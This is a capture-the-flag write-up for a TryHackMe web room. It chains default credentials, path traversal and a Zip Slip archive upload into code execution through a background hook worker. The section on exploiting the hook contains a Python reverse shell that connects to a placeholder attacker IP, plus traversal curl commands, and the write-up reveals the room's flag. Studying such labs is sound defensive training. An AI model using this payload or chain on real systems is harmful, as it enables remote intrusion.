# The Hollow Shell | Hacker Holidays Day 10 | TryHackMe Writeup

## Room Information

- **Room:** The Hollow Shell
- **Event:** Hacker Holidays 2026
- **Category:** Web
- **Difficulty:** Medium
- **Target:** `10.112.128.57`
- **Room Link:** https://tryhackme.com/room/hh-thehollowshell-ddb582ac
- **Flag:** `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`

## Story

The Byte Lotus beachfront allows staff to upload ZIP-based "shells" that customize the in-room displays. Each shell contains a `shell.json` manifest, and the application also mentions optional automation hooks that are processed by a background worker.

The objective is to find the flag.

---

## 1. Initial Enumeration

I started with a full TCP port scan:

```bash
nmap -Pn -p- --min-rate 2000 10.112.128.57
```

The scan returned:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Port `5000` was hosting the web application, so I accessed:

```text
http://10.112.128.57:5000
```

The application redirected to a login page.

---

## 2. Finding the Login Credentials

I inspected the login page source and found an internal comment containing the default credentials:

```text
user: concierge
pass: StayNoticed2024!
```

I used these credentials to authenticate to the Shoreline Display portal.

---

## 3. Investigating the Shell Upload

After logging in, the application presented a shell upload form.

The page explained that a shell is a ZIP archive containing a `shell.json` manifest. The manifest requires a `name` field and can contain an `assets` list.

A minimal valid manifest was:

```json
{
  "name": "test-shell",
  "assets": []
}
```

I created a test ZIP and uploaded it through the portal.

The server returned a unique shell directory, for example:

```text
shells/11e6dc70a0c0/
```

I confirmed that the manifest was accessible:

```bash
curl -i http://10.112.128.57:5000/shells/11e6dc70a0c0/shell.json
```

The server returned:

```json
{
  "name": "test-shell",
  "assets": []
}
```

This confirmed that uploaded ZIP files were being extracted and that their contents were exposed by the application.

---

## 4. Investigating Automation Hooks

The upload page contained an important clue:

> A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore.

I tested whether hooks could be included in `shell.json`.

For example:

```json
{
  "name": "hook-test-3",
  "assets": [],
  "hooks": {
    "pre": "MARKER123",
    "post": "MARKER456"
  }
}
```

The upload succeeded.

I then retrieved the manifest:

```bash
curl -s http://10.112.128.57:5000/shells/c95c79328bcd/shell.json
```

The hooks were preserved:

```json
{
  "name": "hook-test-3",
  "assets": [],
  "hooks": {
    "pre": "MARKER123",
    "post": "MARKER456"
  }
}
```

This indicated that the application accepted user-controlled automation hooks.

---

## 5. Testing the Worker

I created another shell containing a simple post hook:

```json
{
  "name": "worker-test",
  "assets": [],
  "hooks": {
    "post": "echo PWNED > marker.txt"
  }
}
```

The shell was stored at:

```text
shells/d8103c367cc6/
```

I checked whether the marker appeared inside the shell directory:

```bash
curl -i http://10.112.128.57:5000/shells/d8103c367cc6/marker.txt
```

The response was:

```text
HTTP/1.1 404 NOT FOUND
```

This suggested that the hook processing was occurring outside the normal public shell directory.

---

## 6. Path Traversal and Zip Slip

The important vulnerability in the challenge is **Zip Slip**.

Zip Slip occurs when an application extracts archive members without ensuring that their final paths remain inside the intended extraction directory.

A malicious ZIP entry can contain traversal sequences such as:

```text
../../hooks/payload
```

If the application extracts this path without sanitizing it, the file can escape the shell directory.

Conceptually:

```text
shells/<shell_id>/../../hooks/payload
```

can resolve to a location outside:

```text
shells/<shell_id>/
```

The shell upload therefore becomes an arbitrary file-write primitive within directories writable by the application.

---

## 7. Confirming Path Traversal

The challenge's application also exposed a file-serving route under `/shells/`.

The vulnerable path handling could be tested with:

```bash
curl --path-as-is "http://10.112.128.57:5000/shells/../app.py"
```

The `--path-as-is` option is important because it prevents `curl` from normalizing the `../` sequence before sending the request.

This type of path traversal can expose files outside the intended shell directory and can reveal application source code.

The application source showed that shell extraction and automation hooks were separate parts of the application's filesystem layout.

---

## 8. Testing Zip Slip

A simple proof of concept can be used to demonstrate that an archive member can escape the intended directory.

Create the manifest:

```bash
echo '{"name":"zip-slip_check","assets":[]}' > shell.json
```

Create a harmless test file:

```bash
echo 'Zip Slip!!!' > message.txt
```

Create a ZIP containing a traversal path:

```bash
zip zip_slip.zip shell.json ../../static/message.txt
```

Inspect the archive:

```bash
zipinfo zip_slip.zip
```

After uploading the archive, the resulting file can be checked through the application's static file handler:

```text
http://10.112.128.57:5000/static/message.txt
```

If the file is accessible there, the application has allowed the archive to write outside the intended shell directory.

---

## 9. Reaching the Hook Worker

Writing to a static directory alone is not enough for code execution because static files are normally served rather than executed.

The interesting target is the application's `hooks` directory.

The dashboard had already revealed that automation hooks are processed by a background worker. Therefore, the Zip Slip vulnerability could potentially be chained with the worker:

```text
Malicious ZIP
     ↓
Unsafe extraction
     ↓
Path traversal
     ↓
Write file outside shell directory
     ↓
Place payload in hooks/
     ↓
Theme worker processes the hook
     ↓
Code execution
```

This is the key vulnerability chain in the room.

---

## 10. Exploiting the Hook

A payload can be placed into the worker's hook directory through the vulnerable ZIP extraction process.

For example, the archive can contain:

```text
shell.json
../../hooks/revshell.py
```

The payload used in the challenge was a Python reverse shell:

```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",<PORT_NUMBER>))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

subprocess.call(["/bin/bash","-i"])
```

The corresponding shell manifest was:

```json
{
  "name": "exploit",
  "assets": []
}
```

The ZIP archive was constructed so that the payload path traversed out of the shell directory and into `hooks/`.

A listener can be started on the attack machine with:

```bash
nc -lvnp 4444
```

The malicious shell is then uploaded through the Shoreline Display portal.

Because the worker automatically processes the hook, the payload executes in the challenge environment.

---

## 11. Finding the Flag

After obtaining command execution, the flag was located under:

```text
/home/roomservice
```

The final flag was:

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## 12. Attack Chain

The complete attack chain was:

```text
Default Credentials
        ↓
Authenticated Web Portal
        ↓
ZIP Shell Upload
        ↓
Unsafe ZIP Extraction
        ↓
Zip Slip / Path Traversal
        ↓
Arbitrary File Write
        ↓
hooks/ Directory
        ↓
Automation Worker
        ↓
Code Execution
        ↓
Flag
```

## 13. Key Takeaways

### Default Credentials

Credentials should never be embedded in application source code or HTML comments.

### Zip Slip

Applications extracting ZIP archives must canonicalize and validate every archive member before writing it to disk.

The final extraction path should always remain inside the intended directory.

### Dangerous File Uploads

Allowing ZIP uploads creates additional attack surface because an archive can contain:

- Directory traversal sequences
- Unexpected file types
- Symlinks
- Files targeting sensitive locations

### Automation Workers

Background workers that automatically process uploaded content can significantly increase the impact of a file-upload vulnerability.

In this challenge, the combination of unsafe archive extraction and an automated hook worker transformed a file-upload issue into code execution.

---

## Conclusion

The Hollow Shell challenge demonstrated how several small weaknesses can be chained together.

The application exposed default credentials, accepted user-controlled ZIP archives, failed to properly constrain extracted archive paths, and automatically processed hooks.

The resulting chain was:

**Authentication → ZIP upload → Zip Slip → hook placement → worker execution → code execution → flag.**

### Flag

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```
